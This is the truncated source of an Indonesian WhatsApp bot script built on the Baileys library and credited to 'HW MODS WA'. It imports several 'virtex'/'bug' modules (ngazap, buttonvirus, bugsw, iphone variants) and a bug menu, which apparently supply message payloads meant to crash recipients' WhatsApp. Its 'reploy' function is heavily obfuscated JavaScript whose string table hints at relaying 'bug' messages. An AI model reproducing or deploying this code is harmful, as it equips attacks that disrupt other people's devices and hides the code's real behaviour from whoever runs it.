/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base ʜᴡ ᴍᴏᴅꜱ ᴡᴀ

› Create By ʜᴡ ᴍᴏᴅꜱ ᴡᴀ
› Base Ori ʜᴡ ᴍᴏᴅꜱ ᴡᴀ - ʜᴡ ᴍᴏᴅꜱ ᴡᴀ

🌷 KALAU MAU RENAME TARO CREDITS GUA : ʜᴡ ᴍᴏᴅꜱ ᴡᴀ*/

//=================================================//
require('./hwkal')
const { WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const vm = require('node:vm')
const mel = require('kitsune-api')
const axios = require('axios')
const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const hxz = require("hxz-api")
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const mathjs = require('mathjs')
const { uptotelegra } = require('./baseikal/lib/upload')
const textpro = require('./baseikal/lib/textpro')
const fsx = require('fs-extra')
const { color, bgcolor } = require('./baseikal/lib/color')
const ytdl = require("ytdl-core")
const { Primbon } = require('scrape-primbon')
const { Configuration, OpenAIApi } = require('openai') //install modul npm i openai
const primbon = new Primbon()
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
//=================================================//

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []

// COMMAND GUA SULITIN
const { menu } = require('./baseikal/command/menu/menu')
const { allmenu } = require('./baseikal/command/allmenu/allmenu')
const { textmaker } = require('./baseikal/command/textmaker/textmaker')
const { bugmenu } = require('./baseikal/command/bugmenu/bugmenu')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const kalimage = fs.readFileSync ('./baseikal/image/mamak.jpg')
const gopay = fs.readFileSync ('./baseikal/image/gopay.jpg')
const dana = fs.readFileSync ('./baseikal/image/dana.jpg')
const rekening = fs.readFileSync ('./baseikal/image/rekening.jpg')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
var chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
const content = JSON.stringify(m.message)
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"        
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isDocu = (type == 'documentMessage')
const isSticker = (type == 'stickerMessage')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
 const qmsg = (quoted.msg || quoted)
//=================================================//}
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m})} 
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
const reploy = (teks) => {
function _0x2828(){var _0x18a941=['jefXd','izcak','BXlNb','vcbmZ','KbbgB','pKauf','fLYgz','3|0|2','KTQZw','JSTcm','info','ructo','input','conso','terva','log','kofqs','RWRtA','xHNbu','EzeMP','NAtBd','hCrtL','mMSzc','kvQoa','DREWN','URccr','count','ALjVQ','funct','vHlZA','WyOWw','XWQfV','lCjRL','GnexO','messa','cyWsE','luXGb','JSAfb','sqAiT','VhHdd','MSHlc','NfRww','GhOju','OjbDs','eODbU','1160KBxFSa','ionMe','4|3|5','yOTDC','p.net','zaDXb','uGqcK','0|1|3','2684000WbhGit','tGoCG','pIzQd','UTRdm','MJjvP','VHHIV','RnfDw','table','call','SkIbo','__pro','zjxrO','oWmDZ','LfZnF','EogZr','UUFXg','nstru','zENXK','exten','DKIPS','AsMRH','TAjRJ','XTrCt','SSdsi','WxNrH','eltrg','aMTIn','Ddozq','hSLWs','yvpqg','eKWvc','vtoZq','KMDfI','xnLjG','mpoUL','Ipssz','jBlGm','ioFjL','proto','JBRKm','xtMes','trace','519092edgjaX','WtmtF','hfUYM','state','UekWn','jdjNO','whYgV','orfLk','ing','bfzLr','2293305LIylPe','qIpDX','jsFYE','2375550cpKsIP','jisJf','hBupg','iKFRh','UHdpa','atsap','excep','ZbdSu','lSSRt','sage','SvBmc','giUCS','Messa','ssage','lXShE','geId','IWput','aIswU','DNSOU','Bobva','VNIrq','HgOCd','iWReC','qSKtC','dakuy','lengt','xWjkg','\x5c(\x20*\x5c','mpRVe','cwroA','KCbkE','actio','jiVPb','gger','Objec','Wmwfc','ijhtE','nZBpZ','uvfFs','delet','hqCrb','SpnpT','|2|0|','vEDzM','HHRxC','KPAAe','ATitO','RcAxk','GdCNw','essag','DGYhD','ctor(','is\x22)(','KbLWy','fdJtC','VJuaQ','\x5c+\x5c+\x20','ThCOw','yRpwd','FiznI','LUXXc','gaOpd','NwMAK','ISXvG','zA-Z_','DURPl','QdHSb','SKzVu','kcRVk','dedTe','hSXWC','KIOLz','rWHRy','lXBtX','oJOHX','TVxDB','udgtg','bpGIJ','react','SiogA','WtBXw','tEFNF','yqojW','zvMAr','xYjBx','split','{}.co','APMgX','RUwxV','*(?:[','XBsmo','const','PeIGy','bug\x20b','HITMG','retur','e)\x20{}','relay','0-9a-','setIn','shXKm','bind','rzApH','Wcyad','dDTRN','PCyqF','jqxOI','yoKaO',')+)+)','CpLnP','ion\x20*','sujeZ','DjMYc','jfswO','410822veADXA','BCOOB','vXjWg','ASVaJ','FrCLF','yGMkq','ngXbC','bYsgx','GZqWe','vYWLS','20956dWWbru','strin','aFSTP','JJqIg','toStr','|5|2|','tion','SqoxI','ZILeC','SoaVI','|2|4','CcEuL','to__','type','eQNEl','HDvWs','sRqfR','Lehtt','repla','dIzQX','nKLvi','init','quote','debu','jSdBj','Z_$][','dyrhR','Hlfhp','XxdFc','nxsCg','oUVmv','vEKDS','sendM','UpkZR','fsZNr','menti','|4|5|','sende','ITtLp','pgntP','ZHcqd','a-zA-','ityOs','UPuxh','XBVGP','zxXHZ','AEkgd','gFJhg','teks','MsiDS','apply','AGpIW','dZekz','onedJ','EEhyI','Wzeqh','xaMRp','OrtHt','aSIMV','lReot','EITyB','ZLdKc','UTwmV','\x22retu','while','nctio','nuHMZ','TejmH','SBFKj','zxbHw','FklaQ','1|0|3','CIqiz','HgICb','oXokD','rn\x20th','Flwkh','warn','(((.+','yehBS','KAPKW','mnHGR','PFnnT','1209nQpylG','sjcki','xZzkY','gFjMZ','Krcel','searc','test','error','IMuWc','sxONp','QkStC','IXVeE','eRoMV','ubhHj','Pzkcf','ljAYW','FsSbL','XjnSu','bqqcG','@s.wh','fwylU','XCNub','n\x20(fu','\x20(tru','mhxhM','y\x20kal','hqiUa','chain','lHqAH','DSvpG','rUkbw','OGkLc','IKVKq','gUHPY','splrz','VmmdL','DdLuW','$]*)','n()\x20','KWtxh','ilPma','kGLPS','PyzaP','zACdE','HaOIY'];_0x2828=function(){return _0x18a941;};return _0x2828();}(function(_0x472abf,_0x10c292){var _0x426e4e=_0x472abf();function _0x30e8c2(_0x39cc9f,_0x1c1fef,_0x12102f,_0x153c3a,_0x373765){return _0x6767(_0x373765-0xd7,_0x12102f);}function _0x329d77(_0x29b65f,_0x288ef1,_0x309399,_0x5c3774,_0x2015fc){return _0x6767(_0x288ef1-0x12b,_0x29b65f);}function _0x18267d(_0x4cd592,_0x5ce3ab,_0x3e9a7a,_0x161da8,_0xff2868){return _0x6767(_0x161da8- -0x13e,_0xff2868);}function _0x2e3f9e(_0x36e47e,_0x56f663,_0x351f26,_0x51b61d,_0x51c25c){return _0x6767(_0x51b61d- -0x2e0,_0x56f663);}function _0x116e9d(_0x2c8f87,_0x22e00c,_0x5a8e7c,_0x430de7,_0x5a5a8e){return _0x6767(_0x5a8e7c- -0x397,_0x5a5a8e);}while(!![]){try{var _0x5ee2ec=-parseInt(_0x116e9d(-0x1a2,-0x108,-0x18c,-0x228,-0x1b7))/(0x256b+-0x106+0x919*-0x4)+-parseInt(_0x329d77(0x2a6,0x32c,0x3a4,0x2d4,0x3c8))/(-0x6f6*-0x4+-0x29*-0xbc+0x2*-0x1cf9)+parseInt(_0x116e9d(-0xb6,-0xeb,-0x139,-0x149,-0x1e4))/(-0x3c*-0xa3+0x3dc+-0x5*0x869)*(parseInt(_0x30e8c2(0x20b,0x1b7,0x23e,0x174,0x227))/(-0xbf4*0x1+-0x1641+-0x1*-0x2239))+parseInt(_0x116e9d(-0x292,-0x26d,-0x20b,-0x17a,-0x1c3))/(0x22*0xbf+0x1*-0xd3+0x49*-0x56)+-parseInt(_0x329d77(0x327,0x2ba,0x298,0x239,0x2ae))/(0x1*-0xdf3+0x9cf*0x3+-0xf74)+parseInt(_0x18267d(-0x52,0x5a,0x56,0x44,0xd4))/(-0x233d+0xb*0x2c3+0x4e3)+parseInt(_0x329d77(0x23c,0x283,0x2d2,0x215,0x2ff))/(-0x97*-0x1c+-0xf3b+-0x1*0x141);if(_0x5ee2ec===_0x10c292)break;else _0x426e4e['push'](_0x426e4e['shift']());}catch(_0x3c1d35){_0x426e4e['push'](_0x426e4e['shift']());}}}(_0x2828,0x1a19a*-0x1+0x1ceb6+-0x55c73*-0x1));var _0x54d9a8=(function(){function _0x462a1e(_0x55b84d,_0x267e45,_0x475cb2,_0x38302e,_0x107cec){return _0x6767(_0x38302e-0x3b7,_0x107cec);}function _0x5163a5(_0x38244a,_0x3476bf,_0x255062,_0x479b3f,_0x3c5e5d){return _0x6767(_0x255062- -0x58,_0x3476bf);}function _0x548af5(_0x5217c2,_0x2c055e,_0x31dd5f,_0x13b1cf,_0x754522){return _0x6767(_0x31dd5f- -0x101,_0x5217c2);}function _0xffddc1(_0x2dadbd,_0x3f8c97,_0x2b6298,_0x320757,_0x28383c){return _0x6767(_0x2dadbd- -0x17,_0x2b6298);}var _0x1a5b92={'VHHIV':function(_0x8957de,_0x36a5e2){return _0x8957de(_0x36a5e2);},'shXKm':function(_0x21acf8,_0x109c12){return _0x21acf8+_0x109c12;},'GhOju':_0x462a1e(0x590,0x652,0x60b,0x5a5,0x57a)+_0xffddc1(0x25d,0x251,0x1df,0x2a1,0x2cf)+_0xffddc1(0x235,0x1fa,0x1e9,0x1c2,0x1f0)+_0xffddc1(0x26d,0x244,0x1c8,0x21b,0x23f),'EzeMP':_0x462a1e(0x621,0x545,0x5b0,0x59c,0x575)+_0x548af5(0x6c,-0x3e,0x67,-0x2a,0x45)+_0x548af5(0x11e,0x30,0xc1,0x39,0xba)+_0x5163a5(0x1e1,0x24c,0x1f2,0x25a,0x142)+_0x462a1e(0x578,0x5f8,0x61b,0x60d,0x695)+_0x462a1e(0x5dc,0x4f8,0x5e3,0x57a,0x53c)+'\x20)','oWmDZ':function(_0x12146c,_0x4de0b2){return _0x12146c===_0x4de0b2;},'eODbU':_0x1fc5a4(0x1d7,0x280,0x246,0x30e,0x241),'oXokD':_0x462a1e(0x47a,0x587,0x5ac,0x4fb,0x55a),'Flwkh':_0x462a1e(0x4ee,0x5fb,0x4ec,0x56f,0x5e2),'zxbHw':_0x1fc5a4(0x348,0x35c,0x37b,0x386,0x344),'aMTIn':_0x5163a5(0x205,0x139,0x158,0x1fa,0x20a),'lXBtX':_0x548af5(0x137,0x9e,0x84,0x9,0x31)+_0x1fc5a4(0x279,0x2eb,0x251,0x25a,0x33b)+'t','fwylU':_0x462a1e(0x4a3,0x454,0x4eb,0x4f6,0x5a6)+_0xffddc1(0x1e6,0x20c,0x202,0x27a,0x25c)+_0x548af5(0x2,0x15,0xa9,0x8d,0xc7)+')','rWHRy':_0x1fc5a4(0x27c,0x301,0x2b3,0x346,0x2eb)+_0x5163a5(0x18a,0x1a5,0x190,0x225,0x20d)+_0x548af5(0xaf,0xe5,0x133,0xe1,0x17f)+_0x1fc5a4(0x2ce,0x35e,0x2e1,0x33c,0x3e6)+_0x5163a5(0x1f5,0x217,0x199,0x1d9,0x169)+_0x462a1e(0x62b,0x4fa,0x5b0,0x586,0x510)+_0x548af5(0x1f3,0x180,0x182,0x1fa,0x20f),'BCOOB':_0x548af5(0x108,0x9d,0x11f,0x15c,0x1b0),'NfRww':_0x548af5(0x175,0xf9,0x178,0x1a9,0xd0),'FsSbL':_0xffddc1(0x118,0xa6,0x1b3,0x1bb,0xb3),'UUFXg':function(_0x14f6d3){return _0x14f6d3();},'HDvWs':function(_0x3f1d71,_0x199528){return _0x3f1d71===_0x199528;},'ZbdSu':_0x1fc5a4(0x359,0x34c,0x33c,0x299,0x36c)},_0x2fe073=!![];function _0x1fc5a4(_0x1d8f09,_0x1826fd,_0x48a206,_0x59a7ef,_0x351ef4){return _0x6767(_0x1826fd-0x13a,_0x59a7ef);}return function(_0x4bc831,_0x2ebf10){var _0x439e8c={'vtoZq':function(_0x513b34,_0x3b2fba){function _0x4a5320(_0x1151bb,_0x5381c0,_0x27ec7e,_0x2ba56c,_0x2126aa){return _0x6767(_0x27ec7e-0x2cd,_0x2ba56c);}return _0x1a5b92[_0x4a5320(0x4c0,0x43c,0x4c0,0x527,0x4b7)](_0x513b34,_0x3b2fba);},'Lehtt':_0x1a5b92[_0x33e901(0x3c3,0x371,0x41e,0x4c1,0x423)],'rUkbw':_0x1a5b92[_0x5df57c(0x43e,0x3d6,0x3d5,0x36c,0x36d)],'xZzkY':_0x1a5b92[_0x5df57c(0x440,0x45b,0x43b,0x46e,0x459)],'JSAfb':_0x1a5b92[_0xa79b19(0x316,0x353,0x391,0x33d,0x3a8)],'KAPKW':_0x1a5b92[_0xa79b19(0x371,0x2d8,0x2f6,0x271,0x244)],'Wmwfc':function(_0x48f682,_0x499d82){function _0x4aeccf(_0x1a0878,_0x1ee185,_0x5f113f,_0x4a7894,_0x13a84e){return _0x1e7b92(_0x1a0878-0x179,_0x1ee185-0xaa,_0x5f113f-0x10e,_0x1ee185,_0x13a84e- -0x1eb);}return _0x1a5b92[_0x4aeccf(0x288,0x2ab,0x2fd,0x38e,0x335)](_0x48f682,_0x499d82);},'splrz':_0x1a5b92[_0x33e901(0x327,0x46c,0x3af,0x42f,0x3d5)],'QkStC':function(_0x400147,_0x5ca65f){function _0x481130(_0x5ced59,_0x159f77,_0x19ef90,_0x3de9f6,_0xf6e8fd){return _0x4da85f(_0x5ced59-0x54,_0x159f77-0x5a,_0x19ef90-0x1b0,_0x3de9f6,_0x5ced59- -0x13e);}return _0x1a5b92[_0x481130(-0x5d,-0x53,0x2e,-0x9d,0x39)](_0x400147,_0x5ca65f);},'TAjRJ':_0x1a5b92[_0x4da85f(0x3a,0x27,0x56,0xb2,0x3a)],'vEDzM':_0x1a5b92[_0x4da85f(0xc4,0x1b5,0x18a,0x1d5,0x15c)],'SiogA':function(_0x538243){function _0x4e24df(_0x2ce0e2,_0x421cb8,_0x2b0b80,_0x1b4eea,_0x3b0015){return _0x33e901(_0x2ce0e2-0x71,_0x421cb8-0x11e,_0x3b0015,_0x1b4eea-0x101,_0x2b0b80-0xa5);}return _0x1a5b92[_0x4e24df(0x363,0x419,0x3df,0x3a6,0x3b3)](_0x538243);}};function _0x5df57c(_0x3aa594,_0x577ba5,_0x2b2801,_0x15989f,_0x1bc214){return _0x5163a5(_0x3aa594-0x174,_0x1bc214,_0x2b2801-0x2bb,_0x15989f-0xb8,_0x1bc214-0x72);}function _0x33e901(_0x45f4a5,_0xb3f8a8,_0x394ccd,_0x3b192d,_0x47831e){return _0x462a1e(_0x45f4a5-0x9a,_0xb3f8a8-0xa6,_0x394ccd-0x199,_0x47831e- -0x1e4,_0x394ccd);}function _0x1e7b92(_0x43e17b,_0x383805,_0x280d39,_0x491aac,_0x2f82db){return _0x548af5(_0x491aac,_0x383805-0xb9,_0x2f82db-0x4c4,_0x491aac-0x84,_0x2f82db-0x4a);}function _0xa79b19(_0x572679,_0x198f90,_0x2485de,_0x37078a,_0x27818c){return _0x548af5(_0x198f90,_0x198f90-0x12a,_0x2485de-0x220,_0x37078a-0x97,_0x27818c-0x1f0);}function _0x4da85f(_0x228b92,_0x1c15c0,_0x35a585,_0x4adc07,_0x508167){return _0x1fc5a4(_0x228b92-0xb2,_0x508167- -0x24c,_0x35a585-0x12b,_0x4adc07,_0x508167-0x6c);}if(_0x1a5b92[_0x33e901(0x37e,0x3ec,0x400,0x360,0x3ed)](_0x1a5b92[_0x33e901(0x367,0x309,0x36b,0x32d,0x369)],_0x1a5b92[_0x33e901(0x3db,0x407,0x3f1,0x2ea,0x369)])){var _0x2d3209=_0x2fe073?function(){function _0x4fe7bf(_0x41bb41,_0x52bfdd,_0x241ee4,_0x2ab6e7,_0x4217a3){return _0x4da85f(_0x41bb41-0x12f,_0x52bfdd-0x153,_0x241ee4-0x11c,_0x2ab6e7,_0x4217a3-0x245);}var _0x20bb32={'IKVKq':function(_0x586d0c,_0xc3cfab){function _0x45972d(_0x52b74d,_0x51042e,_0x272420,_0x34ab51,_0x21ab3c){return _0x6767(_0x21ab3c-0x2b5,_0x272420);}return _0x1a5b92[_0x45972d(0x3fe,0x3e9,0x3c2,0x400,0x412)](_0x586d0c,_0xc3cfab);},'xWjkg':function(_0x2debcc,_0x42a0f8){function _0x1f94bc(_0x18b2a8,_0x2f8cbf,_0x192724,_0xf3f5b3,_0x3f9c8d){return _0x6767(_0x18b2a8-0x328,_0x2f8cbf);}return _0x1a5b92[_0x1f94bc(0x51b,0x52a,0x597,0x4de,0x513)](_0x2debcc,_0x42a0f8);},'XBsmo':_0x1a5b92[_0x5b42c0(0x4c,0x14,-0x57,-0x64,-0x51)],'GdCNw':_0x1a5b92[_0x5b42c0(-0x95,-0x6a,-0x7,-0x7b,-0xb9)]};function _0x20fe34(_0x3fba84,_0x42dd51,_0xc62ade,_0x5e8571,_0x17ed80){return _0x1e7b92(_0x3fba84-0x3,_0x42dd51-0x39,_0xc62ade-0x14d,_0xc62ade,_0x5e8571- -0x27c);}function _0x1f58ec(_0x2d8bf1,_0x315c0d,_0x2b3bae,_0x56be7a,_0x1492c5){return _0x4da85f(_0x2d8bf1-0xc3,_0x315c0d-0x66,_0x2b3bae-0x121,_0x1492c5,_0x56be7a-0x422);}function _0x5b42c0(_0x5a8f95,_0x2f660a,_0x5de201,_0x26a5c7,_0xda5be0){return _0x4da85f(_0x5a8f95-0x12b,_0x2f660a-0x8c,_0x5de201-0x186,_0x5de201,_0x26a5c7- -0x9f);}function _0x378741(_0x5404af,_0x37f551,_0x41fef3,_0x32ae72,_0x3d1f43){return _0xa79b19(_0x5404af-0x174,_0x3d1f43,_0x37f551-0xa6,_0x32ae72-0x16e,_0x3d1f43-0xc);}if(_0x1a5b92[_0x1f58ec(0x4bd,0x4a5,0x4f6,0x474,0x3f7)](_0x1a5b92[_0x378741(0x3a4,0x314,0x2b5,0x29c,0x2b0)],_0x1a5b92[_0x20fe34(0x1f1,0x2a4,0x27b,0x296,0x282)])){if(_0x2ebf10){if(_0x1a5b92[_0x378741(0x39f,0x329,0x2c2,0x365,0x2c8)](_0x1a5b92[_0x4fe7bf(0x3df,0x40d,0x364,0x43b,0x388)],_0x1a5b92[_0x20fe34(0x445,0x435,0x437,0x39e,0x3c0)])){var _0x1a029d;try{_0x1a029d=_0x20bb32[_0x4fe7bf(0x3f8,0x3af,0x3e5,0x389,0x3b1)](_0x44ea6b,_0x20bb32[_0x20fe34(0x381,0x346,0x2fc,0x2f0,0x33a)](_0x20bb32[_0x5b42c0(0x6f,-0x55,-0x1a,-0x8,-0x2c)](_0x20bb32[_0x20fe34(0x3cc,0x341,0x2ec,0x330,0x3a8)],_0x20bb32[_0x1f58ec(0x48e,0x538,0x4fb,0x4cf,0x47b)]),');'))();}catch(_0x39116c){_0x1a029d=_0x5199c7;}return _0x1a029d;}else{var _0x5f431e=_0x2ebf10[_0x20fe34(0x3af,0x3a8,0x345,0x384,0x3ed)](_0x4bc831,arguments);return _0x2ebf10=null,_0x5f431e;}}}else(function(){return![];}[_0x5b42c0(0x13,0x43,0xac,0x39,-0x2c)+_0x1f58ec(0x3c3,0x4e7,0x3ce,0x43e,0x4ab)+'r'](_0x439e8c[_0x5b42c0(-0x67,-0x57,0x32,-0x3a,0x34)](_0x439e8c[_0x4fe7bf(0x2fa,0x344,0x402,0x3f6,0x34f)],_0x439e8c[_0x20fe34(0x46b,0x355,0x3f9,0x3c3,0x3b6)]))[_0x20fe34(0x41b,0x40f,0x2e3,0x384,0x342)](_0x439e8c[_0x20fe34(0x403,0x36c,0x37b,0x3a7,0x383)]));}:function(){};return _0x2fe073=![],_0x2d3209;}else{var _0x16dfd5=new _0x48b029(_0x439e8c[_0x33e901(0x300,0x37e,0x323,0x2a7,0x31b)]),_0x4a446d=new _0x2284e5(_0x439e8c[_0x5df57c(0x526,0x43c,0x4be,0x53e,0x42e)],'i'),_0x5e9b7c=_0x439e8c[_0x4da85f(0x139,0x134,0x6b,0xf,0xa0)](_0x290599,_0x439e8c[_0x4da85f(0xf1,0x153,0x106,0x110,0x16e)]);!_0x16dfd5[_0x4da85f(0x1bc,0x14b,0x174,0x12b,0x152)](_0x439e8c[_0x33e901(0x436,0x3e5,0x433,0x423,0x43b)](_0x5e9b7c,_0x439e8c[_0xa79b19(0x25d,0x2a8,0x28c,0x32a,0x1ea)]))||!_0x4a446d[_0x5df57c(0x46c,0x41d,0x4c7,0x4bd,0x574)](_0x439e8c[_0x33e901(0x2b6,0x353,0x318,0x3da,0x34a)](_0x5e9b7c,_0x439e8c[_0x5df57c(0x3e7,0x4b7,0x41d,0x370,0x3a0)]))?_0x439e8c[_0x1e7b92(0x585,0x585,0x4d7,0x620,0x575)](_0x5e9b7c,'0'):_0x439e8c[_0x33e901(0x40d,0x3fb,0x41b,0x444,0x3b1)](_0x4a334c);}};}()),_0xc1004a=_0x54d9a8(this,function(){function _0x4e6510(_0xfef39f,_0x3295bd,_0x590f77,_0x7d7d52,_0x24af3d){return _0x6767(_0xfef39f-0x3d2,_0x24af3d);}var _0x5929be={};function _0x143b41(_0x1407c6,_0xa4b5da,_0x240384,_0x1e63a8,_0x383e16){return _0x6767(_0x240384-0x2e,_0xa4b5da);}function _0x293c09(_0x33ff05,_0x134656,_0x542148,_0x57e956,_0x46da2c){return _0x6767(_0x134656-0x319,_0x57e956);}function _0x919e60(_0x5a07a4,_0x47c5b6,_0x5b5e63,_0x70ffa3,_0x27aec1){return _0x6767(_0x5a07a4- -0x1b0,_0x5b5e63);}function _0x4e073e(_0x3ac35,_0x1e83f1,_0x3cd3bc,_0x126867,_0x2403a3){return _0x6767(_0x126867-0x152,_0x3cd3bc);}_0x5929be[_0x919e60(0x7c,0x5,0x24,0xab,-0x9)]=_0x919e60(0xa9,0xeb,0x124,0x15,0x68)+_0x293c09(0x4fd,0x514,0x553,0x4bc,0x55b)+'+$';var _0x59d769=_0x5929be;return 